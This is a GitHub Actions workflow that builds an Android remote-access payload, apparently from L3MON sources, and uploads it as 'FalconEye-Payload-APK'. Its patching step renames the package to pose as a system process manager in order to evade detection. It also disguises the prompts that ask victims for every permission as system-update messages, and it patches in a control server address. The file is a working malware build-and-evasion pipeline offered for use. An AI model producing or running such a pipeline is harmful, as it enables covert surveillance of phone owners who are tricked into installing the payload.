name: Build FalconEye APK

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'temurin'
          java-version: '8'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip
          wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
          wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar

      - name: Signature Obfuscation & Patching
        run: |
          # 1. Change Package Name (The biggest red flag)
          OLD_PKG="com.etechd.l3mon"
          NEW_PKG="com.android.process.manager"
          OLD_PATH="com/etechd/l3mon"
          NEW_PATH="com/android/process/manager"

          echo "Renaming package from $OLD_PKG to $NEW_PKG..."
          
          # Replace strings in all files
          find payload_source -type f -exec sed -i "s|$OLD_PKG|$NEW_PKG|g" {} +
          find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

          # Rename directories
          mkdir -p "payload_source/smali/$NEW_PATH"
          mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
          # Clean up old empty dirs if any
          rm -rf "payload_source/smali/com/etechd"

          # 2. Obfuscate Social Engineering Strings
          # Instead of "Enable ALL permissions", we use something generic
          sed -i "s|Click 'Permissions'|System Update Required|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
          sed -i "s|Enable ALL permissions|Please grant necessary rights|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
          sed -i "s|Enable 'Package Manager'|Finish Optimization|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"

          # 3. Dynamic IP/Port Patching (Existing functionality)
          chmod +x patch_payload.sh
          # Update patch script to use new path
          sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
          ./patch_payload.sh

      - name: Build APK
        run: |
          java -jar apktool.jar b ./payload_source -o unsigned.apk
          java -jar sign.jar -a unsigned.apk --allowResign
          mkdir -p app/build/outputs/apk/debug/
          mv unsigned-aligned-debugSigned.apk app/build/outputs/apk/debug/FalconEye.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: FalconEye-Payload-APK
          path: app/build/outputs/apk/debug/FalconEye.apk
